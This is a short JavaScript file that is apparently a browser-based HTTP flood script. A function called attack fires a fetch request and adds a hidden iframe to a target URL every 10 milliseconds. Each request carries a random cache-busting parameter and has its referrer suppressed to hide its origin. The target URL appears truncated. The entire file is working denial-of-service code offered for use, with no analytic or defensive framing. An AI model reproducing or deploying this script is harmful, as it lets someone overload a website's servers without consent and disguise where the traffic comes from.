var target = "https://m/alimk";
var speed = 10; // Set the interval to 10 milliseconds
var msg = "Default message"; // Set a default message

function attack() {  
  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var targetURL = target + '/?r=' + rand1 + '&msg=' + encodeURIComponent(msg);

  // Using fetch API to make a request without referrer
  fetch(targetURL, {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'Referrer-Policy': 'no-referrer'
    },
    referrerPolicy: 'no-referrer'
  }).then(response => {
    console.log('Fetch request sent successfully');
  }).catch(error => {
    console.log('Failed to send fetch request', error);
  });

  // Creating an iframe with referrerPolicy set to no-referrer
  var iframe = document.createElement('iframe');
  iframe.src = targetURL;
  iframe.style.display = 'none';
  iframe.referrerPolicy = 'no-referrer'; // Disable the referrer
  document.body.appendChild(iframe);
}

setInterval(attack, speed);
